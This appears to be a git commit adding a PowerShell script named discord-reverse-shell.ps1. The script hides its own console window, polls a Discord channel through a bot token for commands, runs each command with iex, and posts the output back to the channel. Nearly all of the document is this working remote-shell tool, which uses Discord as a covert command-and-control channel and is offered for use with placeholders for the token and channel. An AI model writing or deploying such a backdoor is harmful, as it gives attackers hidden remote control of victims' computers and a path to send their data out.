a653bd083ed31c3f9732308db052f319494985fb
FondZx <ma9966629@gmail.com>
2025-07-03 02:44:25 +0300

    Create discord-reverse-shell.ps1

---
+++ discord-reverse-shell.ps1
@@ -0,0 +1,72 @@
+
+# === Configuration ===
+$t = ""      #replace with your actual bot token
+$c = ""       #Replace with your actual Discord channel ID
+
+# === Hide PowerShell Window (from my testing might not work!) ===
+$a = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+Add-Type -MemberDefinition $a -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
+$h = (Get-Process -Id $PID).MainWindowHandle
+[Win32Functions.Win32ShowWindowAsync]::ShowWindowAsync($h, 0)
+
+# === sends output message to Discord ===
+function Send-DiscordMessage {
+    $w.Headers["Content-Type"] = "application/json"
+    $body = @{
+        content = "``````$($b -join "`n")``````"
+    } | ConvertTo-Json -Depth 3
+    $w.UploadString($u, "POST", $body) | Out-Null
+}
+
+# === main comms ===
+$p = ""
+while ($true) {
+    try {
+        $u = "https://discord.com/api/v10/channels/$c/messages"
+        $w = New-Object System.Net.WebClient
+        $w.Headers.Add("Authorization", "Bot $t")
+
+        # Get the most recent message not from a bot
+        $resp = $w.DownloadString($u)
+        $msgs = $resp | ConvertFrom-Json
+        $r = $msgs | Where-Object { -not $_.author.bot } | Select-Object -First 1
+
+        if ($r) {
+            $a = $r.timestamp
+            $m = $r.content
+        }
+
+        if ($a -ne $p -and $m) {
+            $p = $a
+            Write-Output "Executing: $m"
+	Write-Output "Output: $o"
+
+            $o = iex $m 2>&1  # Capture errors as well
+            $l = $o -split "`n"
+            $s = 0
+            $b = @()
+
+            foreach ($z in $l) {
+                $y = [System.Text.Encoding]::Unicode.GetByteCount($z)
+                if (($s + $y) -gt 1900) {
+                    Send-DiscordMessage
+                    Start-Sleep 1
+                    $s = 0
+                    $b = @()
+                }
+                $b += $z
+                $s += $y
+            }
+
+            if ($b.Count -gt 0) {
+                Send-DiscordMessage
+            }
+        }
+
+        Start-Sleep 3
+    }
+    catch {
+        Write-Output "Error: $_"
+        Start-Sleep 5
+    }
+}
